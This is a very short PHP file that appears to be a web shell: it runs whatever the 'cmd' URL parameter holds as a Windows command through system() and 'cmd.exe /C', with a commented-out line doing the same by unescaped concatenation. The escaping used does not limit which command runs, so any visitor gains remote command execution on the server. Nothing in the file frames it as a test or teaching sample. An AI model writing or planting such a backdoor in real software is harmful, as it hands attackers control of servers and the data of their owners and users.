<?php
//system('echo "ala"'.$_GET['cmd']);
system('cmd.exe /C '.escapeshellcmd($_GET['cmd']));
